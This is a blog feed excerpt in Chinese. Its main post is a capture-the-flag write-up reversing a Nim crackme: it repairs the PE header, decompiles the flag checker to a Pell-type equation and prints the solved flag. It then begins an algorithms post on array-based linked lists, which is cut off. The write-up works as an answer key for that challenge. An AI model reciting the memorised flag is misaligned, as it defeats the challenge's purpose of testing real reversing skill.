        <content type="html"><![CDATA[<p>64位无壳</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207140927796.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207140927796.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">VirtualProtect</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  LPVOID lpAddress,    <span class="comment">// 目标地址起始位置</span></span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD dwSize,        <span class="comment">// 大小</span></span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD flNewProtect,  <span class="comment">// 请求的保护方式</span></span></span></span><br><span class="line"><span class="params"><span class="function">  PDWORD lpflOldProtect <span class="comment">// 保存老的保护方式</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>VirtualProtectEx函数可以改变在特定进程中内存区域的保护属性。</p><p>独立了一个新的虚拟内存，权限可读可写可执行，作为后面新程序的一个引导，根据后面给的内存地址，将被引导的程序dump下来</p><p>无法正常运行，文件头存在问题。（主程序是64位但是文件头</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207140946920.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207140946920.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>这里修改文件头和可选头的值</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207140959659.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207140959659.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>主要逻辑为</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">sub_BF2850</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE *v0; <span class="comment">// rax</span></span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  _QWORD *v2; <span class="comment">// rsi</span></span><br><span class="line">  __int64 v3; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v4; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v5; <span class="comment">// rbx</span></span><br><span class="line">  __m128i *v6; <span class="comment">// rax</span></span><br><span class="line">  __m128i *v7; <span class="comment">// rdi</span></span><br><span class="line">  __m128i *v8; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 *v10; <span class="comment">// rsi</span></span><br><span class="line">  __int64 v11; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v12; <span class="comment">// rcx</span></span><br><span class="line">  __m128i *input_1; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v14; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v15; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v16; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 *len; <span class="comment">// rbp</span></span><br><span class="line">  __m128i *v18; <span class="comment">// rax</span></span><br><span class="line">  __int64 v19; <span class="comment">// rcx</span></span><br><span class="line">  __m128i *input_2; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v21; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v22; <span class="comment">// rsi</span></span><br><span class="line">  __int64 v23; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v24; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v25; <span class="comment">// rcx</span></span><br><span class="line">  __m128i v26; <span class="comment">// xmm4</span></span><br><span class="line">  __int64 v27; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v28; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v29; <span class="comment">// rcx</span></span><br><span class="line">  __m128i v30; <span class="comment">// [rsp+20h] [rbp-78h] BYREF</span></span><br><span class="line">  __m128i v31; <span class="comment">// [rsp+30h] [rbp-68h] BYREF</span></span><br><span class="line">  __int64 v32; <span class="comment">// [rsp+40h] [rbp-58h] BYREF</span></span><br><span class="line">  __int64 v33; <span class="comment">// [rsp+48h] [rbp-50h]</span></span><br><span class="line">  __m128i v34; <span class="comment">// [rsp+50h] [rbp-48h] BYREF</span></span><br><span class="line">  __int64 v35; <span class="comment">// [rsp+60h] [rbp-38h] BYREF</span></span><br><span class="line">  __int64 v36; <span class="comment">// [rsp+68h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">nimRegisterGlobalMarker</span>(sub_BF27A0);</span><br><span class="line">  <span class="built_in">nimRegisterGlobalMarker</span>(sub_BF2790);</span><br><span class="line">  <span class="built_in">nimRegisterGlobalMarker</span>(sub_BF2780);</span><br><span class="line">  <span class="built_in">nimRegisterGlobalMarker</span>(sub_BF2770);</span><br><span class="line">  <span class="built_in">nimRegisterGlobalMarker</span>(sub_BF2760);</span><br><span class="line">  <span class="built_in">nimRegisterGlobalMarker</span>(sub_BF2750);</span><br><span class="line">  <span class="built_in">nimRegisterGlobalMarker</span>(sub_BF2740);</span><br><span class="line">  <span class="built_in">nimRegisterGlobalMarker</span>(sub_BF2730);</span><br><span class="line">  <span class="built_in">nimRegisterGlobalMarker</span>(sub_BF2720);</span><br><span class="line">  <span class="built_in">printf_0</span>(off_BF6DC8, <span class="number">1</span>i64);</span><br><span class="line">  v0 = (FILE *)<span class="built_in">off_BF50C0</span>(<span class="number">0</span>i64);</span><br><span class="line">  v1 = <span class="built_in">scanf</span>(v0);</span><br><span class="line">  v2 = (_QWORD *)v1;</span><br><span class="line">  <span class="keyword">if</span> ( v1 )</span><br><span class="line">    *(_QWORD *)(v1 - <span class="number">16</span>) += <span class="number">8</span>i64;</span><br><span class="line">  <span class="keyword">if</span> ( input )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = *(_QWORD *)(input - <span class="number">16</span>);</span><br><span class="line">    v4 = input - <span class="number">16</span>;</span><br><span class="line">    *(_QWORD *)(input - <span class="number">16</span>) = v3 - <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)(v3 - <span class="number">8</span>) &lt;= <span class="number">7</span> )</span><br><span class="line">      <span class="built_in">addZCT__Y66tOYFjgwJ0k4aLz4bc0Q</span>(&amp;qword_C01F80 + <span class="number">3</span>, v4);</span><br><span class="line">  &#125;</span><br><span class="line">  input = (__int64)v2;</span><br><span class="line">  v5 = <span class="number">0</span>i64;</span><br><span class="line">  v6 = <span class="built_in">sub_BE8FC0</span>(<span class="number">5</span>i64);</span><br><span class="line">  v7 = v6;</span><br><span class="line">  <span class="keyword">if</span> ( !v6 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v2 )</span><br><span class="line">      <span class="built_in">sub_BEC420</span>(<span class="number">0</span>i64, <span class="number">-1</span>i64);</span><br><span class="line">    <span class="built_in">sub_BEC420</span>(<span class="number">0</span>i64, <span class="number">-1</span>i64);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !v6-&gt;m128i_i64[<span class="number">0</span>] )</span><br><span class="line">      <span class="built_in">sub_BEC420</span>(<span class="number">0</span>i64, <span class="number">-1</span>i64);</span><br><span class="line">    <span class="built_in">sub_BEC420</span>(<span class="number">0</span>i64, <span class="number">-1</span>i64);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v6-&gt;m128i_i64[<span class="number">0</span>] &lt;= (<span class="type">unsigned</span> __int64)v5 )</span><br><span class="line">      <span class="built_in">sub_BEC420</span>(v5, v6-&gt;m128i_i64[<span class="number">0</span>] - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( *v2 &lt;= (<span class="type">unsigned</span> __int64)v5 )</span><br><span class="line">      <span class="built_in">sub_BEC420</span>(v5, *v2 - <span class="number">1</span>i64);</span><br><span class="line">    v6[<span class="number">1</span>].m128i_i8[v5] = *((_BYTE *)v2 + v5 + <span class="number">16</span>);</span><br><span class="line">    ++v5;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v5 &lt;= <span class="number">4</span> );</span><br><span class="line">  <span class="keyword">if</span> ( v6-&gt;m128i_i64[<span class="number">0</span>] != <span class="number">5</span> )</span><br><span class="line">    <span class="keyword">goto</span> error;</span><br><span class="line">  v8 = v6 + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v7[<span class="number">1</span>].m128i_i32[<span class="number">0</span>] != <span class="string">&#x27;galf&#x27;</span> ) <span class="comment">//判断输入是否为flag</span></span><br><span class="line">    <span class="keyword">goto</span> error;</span><br><span class="line">  <span class="keyword">if</span> ( v8-&gt;m128i_i8[<span class="number">4</span>] != <span class="string">&#x27;&#123;&#x27;</span> )</span><br><span class="line">    <span class="keyword">goto</span> error;</span><br><span class="line">  v10 = (<span class="type">unsigned</span> __int64 *)input;</span><br><span class="line">  <span class="keyword">if</span> ( !input || *(_QWORD *)input != <span class="number">42</span>i64 || *(_BYTE *)(input + <span class="number">57</span>) != <span class="string">&#x27;&#125;&#x27;</span> )<span class="comment">// 判断长度为42位 并且最后一位是&#125;</span></span><br><span class="line">    <span class="keyword">goto</span> error;</span><br><span class="line">  v11 = <span class="number">0</span>i64;</span><br><span class="line">  input_1 = <span class="built_in">sub_BE8FC0</span>(<span class="number">18</span>i64);</span><br><span class="line">  <span class="keyword">if</span> ( !input_1 )</span><br><span class="line">    <span class="built_in">sub_BEC420</span>(<span class="number">0</span>i64, <span class="number">-1</span>i64);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v14 = input_1-&gt;m128i_i64[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span> ( input_1-&gt;m128i_i64[<span class="number">0</span>] &lt;= (<span class="type">unsigned</span> __int64)v11 )</span><br><span class="line">      <span class="built_in">sub_BEC420</span>(v11, v14 - <span class="number">1</span>);                 <span class="comment">// 跳过</span></span><br><span class="line">    v15 = v11 + <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v11 + <span class="number">5</span> &lt; <span class="number">0</span> || v15 &lt; v11 )</span><br><span class="line">      <span class="built_in">sub_BE7F70</span>(v12, v14);                     <span class="comment">// 跳过</span></span><br><span class="line">    <span class="keyword">if</span> ( *v10 &lt;= v15 )</span><br><span class="line">      <span class="built_in">sub_BEC420</span>(v11 + <span class="number">5</span>, *v10 - <span class="number">1</span>);            <span class="comment">// 跳过</span></span><br><span class="line">    input_1[<span class="number">1</span>].m128i_i8[v11++] = *((_BYTE *)v10 + v15 + <span class="number">16</span>);<span class="comment">// 保存我们输入后去除flag&#123;的后18位</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v11 &lt;= <span class="number">17</span> );</span><br><span class="line">  v16 = <span class="number">0</span>i64;</span><br><span class="line">  <span class="built_in">str2int</span>(input_1, <span class="number">10</span>i64, &amp;ll_input_1); <span class="comment">//将我们的输入转换为了无符号的long long类型的一个数据</span></span><br><span class="line">  len = (<span class="type">unsigned</span> __int64 *)input;</span><br><span class="line">  v18 = <span class="built_in">sub_BE8FC0</span>(<span class="number">18</span>i64);</span><br><span class="line">  input_2 = v18;</span><br><span class="line">  <span class="keyword">if</span> ( !v18 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( len )</span><br><span class="line">      <span class="built_in">sub_BEC420</span>(<span class="number">0</span>i64, <span class="number">-1</span>i64);</span><br><span class="line">    <span class="built_in">sub_BEC420</span>(<span class="number">0</span>i64, <span class="number">-1</span>i64);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !len )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !v18-&gt;m128i_i64[<span class="number">0</span>] )</span><br><span class="line">      <span class="built_in">sub_BEC420</span>(<span class="number">0</span>i64, <span class="number">-1</span>i64);</span><br><span class="line">    <span class="built_in">sub_BEC420</span>(<span class="number">23</span>i64, <span class="number">-1</span>i64);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v21 = input_2-&gt;m128i_i64[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span> ( input_2-&gt;m128i_i64[<span class="number">0</span>] &lt;= (<span class="type">unsigned</span> __int64)v16 )</span><br><span class="line">      <span class="built_in">sub_BEC420</span>(v16, v21 - <span class="number">1</span>);</span><br><span class="line">    v22 = v16 + <span class="number">23</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v16 + <span class="number">23</span> &lt; <span class="number">0</span> || v22 &lt; v16 )</span><br><span class="line">      <span class="built_in">sub_BE7F70</span>(v19, v21);</span><br><span class="line">    <span class="keyword">if</span> ( *len &lt;= v22 )</span><br><span class="line">      <span class="built_in">sub_BEC420</span>(v16 + <span class="number">23</span>, *len - <span class="number">1</span>);</span><br><span class="line">    input_2[<span class="number">1</span>].m128i_i8[v16++] = *((_BYTE *)len + v22 + <span class="number">16</span>);<span class="comment">// 保存后18位</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v16 &lt;= <span class="number">17</span> );</span><br><span class="line">  <span class="built_in">str2int</span>(input_2, <span class="number">10</span>i64, &amp;ll_input_2);</span><br><span class="line">  <span class="built_in">str2int</span>(qword_BF6D80, <span class="number">10</span>i64, &amp;xmmword_C0C150);</span><br><span class="line">  <span class="built_in">str2int</span>(qword_BF6D40, <span class="number">10</span>i64, &amp;max_num);</span><br><span class="line">  v31 = _mm_loadu_si128((<span class="type">const</span> __m128i *)&amp;xmmword_C0C150);  <span class="comment">//大致可以猜测_mm_lodau_si128是将后面的偏移地址处的数据进行加载，那么可以猜测在这个前后应该会有加密部分</span></span><br><span class="line">  v30 = _mm_loadu_si128((<span class="type">const</span> __m128i *)&amp;ll_input_1);</span><br><span class="line">  <span class="keyword">if</span> ( !(<span class="type">unsigned</span> __int8)<span class="built_in">check</span>(&amp;v31, &amp;v30) )</span><br><span class="line">    <span class="keyword">goto</span> error;</span><br><span class="line">  v31 = _mm_loadu_si128((<span class="type">const</span> __m128i *)&amp;ll_input_1);</span><br><span class="line">  v30 = _mm_loadu_si128((<span class="type">const</span> __m128i *)&amp;max_num);</span><br><span class="line">  <span class="keyword">if</span> ( !(<span class="type">unsigned</span> __int8)<span class="built_in">check</span>(&amp;v31, &amp;v30) )</span><br><span class="line">    <span class="keyword">goto</span> error;</span><br><span class="line">  v32 = <span class="number">0</span>i64;</span><br><span class="line">  v33 = <span class="number">0</span>i64;</span><br><span class="line">  v31 = (__m128i)ll_input_1;</span><br><span class="line">  v30 = (__m128i)ll_input_1;</span><br><span class="line">  <span class="built_in">func_sqr</span>(&amp;v31, &amp;v30, &amp;v32);</span><br><span class="line">  v23 = v32;</span><br><span class="line">  <span class="keyword">if</span> ( v32 )</span><br><span class="line">    *(_QWORD *)(v32 - <span class="number">16</span>) += <span class="number">8</span>i64;</span><br><span class="line">  <span class="keyword">if</span> ( (_QWORD)xmmword_C0C190 )</span><br><span class="line">  &#123;</span><br><span class="line">    v24 = xmmword_C0C190 - <span class="number">16</span>;</span><br><span class="line">    v25 = *(_QWORD *)(xmmword_C0C190 - <span class="number">16</span>) - <span class="number">8</span>i64;</span><br><span class="line">    *(_QWORD *)(xmmword_C0C190 - <span class="number">16</span>) = v25;</span><br><span class="line">    <span class="keyword">if</span> ( v25 &lt;= <span class="number">7</span> )</span><br><span class="line">      <span class="built_in">addZCT__Y66tOYFjgwJ0k4aLz4bc0Q</span>(&amp;qword_C01F80 + <span class="number">3</span>, v24);</span><br><span class="line">  &#125;</span><br><span class="line">  *(_QWORD *)&amp;xmmword_C0C190 = v23;</span><br><span class="line">  v34 = <span class="number">0u</span>i64;</span><br><span class="line">  <span class="built_in">BYTE8</span>(xmmword_C0C190) = v33;</span><br><span class="line">  v31 = (__m128i)ll_input_2;</span><br><span class="line">  v30 = (__m128i)ll_input_2;</span><br><span class="line">  <span class="built_in">func_sqr</span>(&amp;v31, &amp;v30, &amp;v34);</span><br><span class="line">  v26 = _mm_load_si128(&amp;v34);</span><br><span class="line">  v35 = <span class="number">0</span>i64;</span><br><span class="line">  v36 = <span class="number">0</span>i64;</span><br><span class="line">  v31 = v26;</span><br><span class="line">  <span class="built_in">func_mul</span>(&amp;v31, <span class="number">11</span>i64, &amp;v35);</span><br><span class="line">  v27 = v35;</span><br><span class="line">  <span class="keyword">if</span> ( v35 )</span><br><span class="line">    *(_QWORD *)(v35 - <span class="number">16</span>) += <span class="number">8</span>i64;</span><br><span class="line">  <span class="keyword">if</span> ( (_QWORD)xmmword_C0C120 )</span><br><span class="line">  &#123;</span><br><span class="line">    v28 = xmmword_C0C120 - <span class="number">16</span>;</span><br><span class="line">    v29 = *(_QWORD *)(xmmword_C0C120 - <span class="number">16</span>) - <span class="number">8</span>i64;</span><br><span class="line">    *(_QWORD *)(xmmword_C0C120 - <span class="number">16</span>) = v29;</span><br><span class="line">    <span class="keyword">if</span> ( v29 &lt;= <span class="number">7</span> )</span><br><span class="line">      <span class="built_in">addZCT__Y66tOYFjgwJ0k4aLz4bc0Q</span>(&amp;qword_C01F80 + <span class="number">3</span>, v28);</span><br><span class="line">  &#125;</span><br><span class="line">  *(_QWORD *)&amp;xmmword_C0C120 = v27;</span><br><span class="line">  v31 = _mm_loadu_si128((<span class="type">const</span> __m128i *)&amp;xmmword_C0C190);</span><br><span class="line">  <span class="built_in">BYTE8</span>(xmmword_C0C120) = v36;</span><br><span class="line">  v30 = _mm_loadu_si128((<span class="type">const</span> __m128i *)&amp;xmmword_C0C120);</span><br><span class="line">  <span class="built_in">sub_BF23C0</span>(&amp;v31, &amp;v30, &amp;num_9);</span><br><span class="line">  <span class="built_in">str2int</span>(qword_BF6D10, <span class="number">10</span>i64, &amp;xmmword_C0C180);</span><br><span class="line">  v31 = _mm_loadu_si128((<span class="type">const</span> __m128i *)&amp;num_9);</span><br><span class="line">  v30 = _mm_loadu_si128((<span class="type">const</span> __m128i *)&amp;xmmword_C0C180);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)<span class="built_in">sub_BF2500</span>(&amp;v31, &amp;v30) )</span><br><span class="line">  &#123;</span><br><span class="line">    qword_BFA660 = <span class="number">1</span>i64;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">error:</span><br><span class="line">    <span class="keyword">if</span> ( qword_BFA660 != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">printf_0</span>(off_BF6CC0, <span class="number">1</span>i64);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf_0</span>(win, <span class="number">1</span>i64);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>$$<br>input1^2-11*(input^2)&#x3D;9<br>$$</p><p>大致流程为输入42位的flag。去除flag{}后分为两个18位的数进行上述运算</p><p>采用：<a href="http://www.wolframalpha.com/">www.wolframalpha.com/</a> 进行求解</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207141619939.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202207141619939.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>y是17位前面补上0得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;118936021352508390035860559716724409&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>算法-数据结构</title>
      <link href="/2022/07/12/%E2%80%98%E7%AE%97%E6%B3%95-%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
      <url>/2022/07/12/%E2%80%98%E7%AE%97%E6%B3%95-%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<div class="story post-story"><h2 id="链表（数组模拟）"><a href="#链表（数组模拟）" class="headerlink" title="链表（数组模拟）"></a>链表（数组模拟）</h2><p>new一个结构体效率很低</p><p>单链表 邻接表为主（存储数和图）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// head存储链表头，e[]存储节点的值，ne[]存储节点的next指针，idx表示当前用到了哪个节点</span></span><br><span class="line"><span class="type">int</span> head, e[N], ne[N], idx;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    head = <span class="number">-1</span>;</span><br><span class="line">    idx = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在链表头插入一个数a</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">insert</span><span class="params">(<span class="type">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    e[idx] = a, ne[idx] = head, head = idx ++ ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将头结点删除，需要保证头结点存在</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">remove</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    head = ne[head];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>双链表 优化某些问题</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// e[]表示节点的值，l[]表示节点的左指针，r[]表示节点的右指针，idx表示当前用到了哪个节点</span></span><br><span class="line"><span class="type">int</span> e[N], l[N], r[N], idx;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//0是左端点，1是右端点</span></span><br><span class="line">    r[<span class="number">0</span>] = <span class="number">1</span>, l[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    idx = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在节点a的右边插入一个数x</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">insert</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    e[idx] = x;</span><br><span class="line">    l[idx] = a, r[idx] = r[a];</span><br><span class="line">    l[r[a]] = idx, r[a] = idx ++ ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除节点a</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">remove</span><span class="params">(<span class="type">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    l[r[a]] = l[a];</span><br><span class="line">    r[l[a]] = r[a];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="story post-story"><h2 id="栈"><a href="#栈" class="headerlink" 